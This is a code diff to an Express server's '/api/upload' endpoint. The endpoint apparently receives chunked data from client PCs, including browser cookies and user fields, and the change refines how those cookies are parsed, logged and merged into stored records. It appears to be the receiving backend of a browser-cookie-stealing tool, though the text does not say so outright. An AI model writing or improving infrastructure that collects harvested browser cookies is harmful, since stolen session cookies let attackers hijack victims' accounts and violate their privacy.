@@ -372,25 +372,31 @@ app.post('/api/upload', (req, res) => {
             cookies: transformedBrowserCookies.length || 0
         };
 
-        // Only include browserCookies in pcData if we actually have cookies in this chunk
-        // This prevents overwriting existing cookies with empty arrays from later chunks
+        // Handle browserCookies - always include if present, even if empty (so merge knows to update)
         const pcDataToStore = { ...pcData };
         
-        // Always preserve browserCookies if they exist in the incoming data
+        // If we have cookies (either parsed array or original string), include them
         if (pcData.browserCookies !== undefined && pcData.browserCookies !== null) {
             if (transformedBrowserCookies.length > 0) {
-                // We have parsed cookies - use them
+                // We successfully parsed cookies - use the array
                 pcDataToStore.browserCookies = transformedBrowserCookies;
+                console.log(`Cookies included in chunk: ${transformedBrowserCookies.length} cookies (parsed from string)`);
             } else if (typeof pcData.browserCookies === 'string' && pcData.browserCookies.length > 0) {
                 // Keep the original string if parsing failed but string exists
                 pcDataToStore.browserCookies = pcData.browserCookies;
+                console.log(`Cookies included in chunk: string length ${pcData.browserCookies.length} (keeping as string)`);
             } else if (Array.isArray(pcData.browserCookies) && pcData.browserCookies.length > 0) {
                 // Keep the array if it exists
                 pcDataToStore.browserCookies = pcData.browserCookies;
+                console.log(`Cookies included in chunk: ${pcData.browserCookies.length} cookies (array)`);
+            } else {
+                // Empty/null cookies - still include so merge knows to clear them
+                pcDataToStore.browserCookies = null;
             }
-            // If browserCookies is null/empty, we still include it so merge logic knows to update
+        } else {
+            // No browserCookies in this chunk - don't include it (allows merge to preserve existing)
+            delete pcDataToStore.browserCookies;
         }
-        // If browserCookies is not in pcData at all, don't include it (allows merge to preserve existing)
         
         // Extract user from pcData
         const user = pcData?.user || null;
